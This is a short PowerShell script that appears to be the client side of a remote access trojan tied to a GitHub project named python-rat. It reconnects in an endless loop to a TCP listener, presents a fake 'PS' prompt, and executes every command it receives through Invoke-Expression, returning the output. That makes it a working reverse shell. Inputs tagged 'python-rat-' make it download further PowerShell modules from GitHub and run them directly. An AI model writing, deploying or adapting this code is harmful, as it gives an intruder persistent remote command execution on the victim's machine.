while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("localhost", "9999")
    } catch {
        Start-Sleep 5
        continue
    }

    if ($client.Connected) {
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $buffer = New-Object byte[] 1024
        $enc = [System.Text.Encoding]::ASCII

        while ($client.Connected) {
            try {
                $writer.Write("PS " + (Get-Location).Path + "> ")
                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
                if ($bytesRead -le 0) { throw "Connection closed." }
                $input = $enc.GetString($buffer, 0, $bytesRead).Trim()

                if ($input -like "*python-rat-*") {
                    $url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/scr/" + ($input -replace "python-rat-", "") + ".ps1"
                    iex (iwr $url).Content
                    $writer.Write($data)
                } else {
                    $writer.Write((Invoke-Expression $input 2>&1 | Out-String))
                }
            } catch { break }
        }
    }
    $client.Close()
    Start-Sleep 5
}
